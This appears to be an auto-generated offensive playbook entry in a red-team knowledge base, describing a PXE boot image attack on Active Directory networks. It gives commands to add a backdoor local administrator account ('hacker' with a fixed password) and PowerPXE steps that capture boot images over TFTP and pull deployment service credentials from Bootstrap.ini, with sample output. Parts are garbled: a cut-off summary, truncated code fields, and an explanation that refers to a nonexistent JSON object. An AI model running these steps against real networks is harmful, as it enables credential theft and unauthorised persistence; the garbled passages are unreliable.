---
id: 352d7dc8-cded-4e1d-8192-1c78c4f87c43
name: PXE Boot Image Attack - Local Admin Account Hijack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.406065+00:00'
updated_at: '2023-04-10T20:36:00.755243+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Account Manipulation|T1098 - Account Manipulation]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Active Directory Attacks]]'
- '[[PXE Boot image attack]]'
commands:
- '[[Create new user and add to administrators group]]'
- '[[Download BCD file and extract WIM files]]'
- '[[Download WIM files]]'
- '[[Extract BCD path from DHCP response]]'
- '[[Find Bootstrap.ini in LiteTouchPE_x86.wim]]'
- '[[Get a valid IP address]]'
- '[[Identify WIM files]]'
- '[[Parse BCD file]]'
- '[[Start PXE exploit on Ethernet interface]]'
- '[[Start PXE exploit on lab 0 interface]]'
---

# PXE Boot Image Attack - Local Admin Account Hijack

## Summary

A PXE Boot image attack can be used to hijack local administrator accounts on target machines. This is accomplished by creating a custom PXE Boot image and configuring it to launch a script that adds a new local administrator account with a known password. Once the target machine is booted from the

## Description

# Description

A PXE Boot image attack can be used to hijack local administrator accounts on target machines. This is accomplished by creating a custom PXE Boot image and configuring it to launch a script that adds a new local administrator account with a known password. Once the target machine is booted from the custom PXE Boot image, the attacker can log in with the new local administrator account and use it to move laterally within the target network. This attack can be particularly effective in environments where local administrator accounts have been granted elevated privileges. 

From a technical standpoint, the attacker would need to create a custom PXE Boot image and script that adds the new local administrator account. The script could be written in PowerShell or another scripting language. The attacker would also need to know the target machine's MAC address in order to configure the PXE Boot image to launch on that machine.

The business value of this attack is that it allows an attacker to gain access to target machines without needing to know valid domain credentials. This can be useful in situations where domain credentials are tightly controlled or where the attacker has limited access to the target network.

## Requirements

1. Access to the target network

1. Ability to create custom PXE Boot image and script

1. Knowledge of target machine's MAC address

## Defense

1. Restrict network access to only trusted devices

1. Implement strict access controls for local administrator accounts

1. Monitor for unusual PXE Boot activity on the network

## Objectives

1. Hijack local administrator accounts on target machines

1. Gain access to target machines without valid domain credentials

1. Move laterally within the target network

# Instructions

1. To add a local administrator account, open a command prompt with administrator privileges and enter the following commands:

net user [username] [password] /add
net localgroup administrators /add [username]

Replace [username] with the desired username and [password] with the desired password. This will create a new local administrator account on the machine.

**Code**: [[net user hacker Password123! /add
net localgroup a]]

> The 'net user' command is used to create a new user account on the system. The '/add' switch tells the command to add a new user. The 'net localgroup' command is used to manage local groups on the system. The '/add' switch tells the command to add a new member to the group. By adding the new user to the 'administrators' group, we are granting them full administrative privileges on the machine.

**Command** ([[Create new user and add to administrators group]]):

```bash
net user hacker Password123! /add
net localgroup administrators /add hacker
```

2. To extract the pre-boot image and find default passwords and domain accounts, follow these steps:
1. Import the PowerPXE module by running the following command: Import-Module .\PowerPXE.ps1
2. Start the exploit on the Ethernet interface by running the following command: Get-PXEcreds -InterfaceAlias Ethernet
3. Wait for the DHCP to get an address by running the following commands:
    a. Get a valid IP address
    b. Request BCD File path
    c. Download the BCD file and extract wim files
4. Parse the wim files to find interesting data by running the following commands:
    a. Open LiteTouchPE_x86.wim
    b. Find the Bootstrap.ini file
    c. Retrieve the DeployRoot, UserID, and UserPassword values

**Code**: [[# Import the module
PS > Import-Module .\PowerPXE.]]

> This JSON object provides instructions for extracting the pre-boot image and finding default passwords and domain accounts using the PowerPXE.ps1 module. The 'data' field contains the PowerShell commands required to perform the task, while the 'text' field provides a brief summary of the task. The 'instruction' field provides detailed step-by-step instructions for performing the task, while the 'explain' field provides an overview of the JSON object and its purpose. The 'name' field provides a descriptive name for the task.

**Command** ([[Start PXE exploit on Ethernet interface]]):

```bash
Get-PXEcreds -InterfaceAlias Ethernet
```

**Command** ([[Start PXE exploit on lab 0 interface]]):

```bash
Get-PXECreds -InterfaceAlias « lab 0 »
```

**Command** ([[Get a valid IP address]]):

```bash
DHCP proposal IP address: 192.168.22.101
DHCP Validation: DHCPACK
IP address configured: 192.168.22.101
```

**Command** ([[Extract BCD path from DHCP response]]):

```bash
BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
TFTP IP Address:  192.168.22.3
```

**Command** ([[Download BCD file and extract WIM files]]):

```bash
Launch TFTP download
Transfer succeeded.
```

**Command** ([[Parse BCD file]]):

```bash
conf.bcd
```

**Command** ([[Identify WIM files]]):

```bash
\Boot\x86\Images\LiteTouchPE_x86.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

**Command** ([[Download WIM files]]):

```bash
Launch TFTP download
Transfer succeeded.
```

**Command** ([[Find Bootstrap.ini in LiteTouchPE_x86.wim]]):

```bash
DeployRoot = \\LAB-MDT\DeploymentShare$
UserID = MdtService
UserPassword = Somepass1
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Account Manipulation|T1098 - Account Manipulation]]
- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Create new user and add to administrators group]]
- [[Download BCD file and extract WIM files]]
- [[Download WIM files]]
- [[Extract BCD path from DHCP response]]
- [[Find Bootstrap.ini in LiteTouchPE_x86.wim]]
- [[Get a valid IP address]]
- [[Identify WIM files]]
- [[Parse BCD file]]
- [[Start PXE exploit on Ethernet interface]]
- [[Start PXE exploit on lab 0 interface]]

## Tags

- [[Active Directory Attacks]]
- [[PXE Boot image attack]]
